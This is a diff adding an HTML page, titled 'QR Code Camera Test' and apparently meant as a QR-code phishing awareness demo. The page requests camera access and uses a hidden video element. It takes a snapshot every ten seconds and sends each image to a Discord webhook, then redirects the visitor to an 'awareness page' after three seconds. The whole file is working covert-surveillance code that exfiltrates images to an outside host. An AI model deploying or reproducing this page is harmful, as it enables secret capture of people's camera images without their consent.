@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>QR Code Camera Test</title>
+</head>
+<body>
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <script>
+        const video = document.getElementById('video');
+        const webhookURL = "YOUR_DISCORD_WEBHOOK_URL";  // Replace with actual Discord Webhook URL
+        const redirectURL = "https://your-awareness-page.com"; // Replace with your awareness page URL
+
+        // Request camera access
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+                console.log("Camera access granted.");
+                captureImage(); // Start capturing images
+                setTimeout(() => {
+                    window.location.href = redirectURL; // Redirect after camera access
+                }, 3000); // Redirect after 3 seconds
+            })
+            .catch(err => {
+                console.error("Camera access denied!", err);
+                alert("You denied camera access! This could be a security risk when scanning unknown QR codes.");
+            });
+
+        // Capture and send an image every 10 seconds
+        function captureImage() {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+
+            setInterval(() => {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                // Convert image to Blob
+                canvas.toBlob(blob => {
+                    const formData = new FormData();
+                    formData.append("file", blob, "snapshot.png");
+                    formData.append("content", "📸 New Image Captured!");
+
+                    console.log("Sending image to Discord...");
+
+                    // Send to Discord Webhook
+                    fetch(webhookURL, {
+                        method: "POST",
+                        body: formData
+                    })
+                    .then(response => {
+                        if (!response.ok) {
+                            throw new Error(`HTTP error! Status: ${response.status}`);
+                        }
+                        return response.text();
+                    })
+                    .then(data => console.log("Image sent successfully:", data))
+                    .catch(error => console.error("Error sending image:", error));
+
+                }, "image/png");
+
+            }, 10000); // Capture every 10 seconds
+        }
+    </script>
+</body>
+</html>
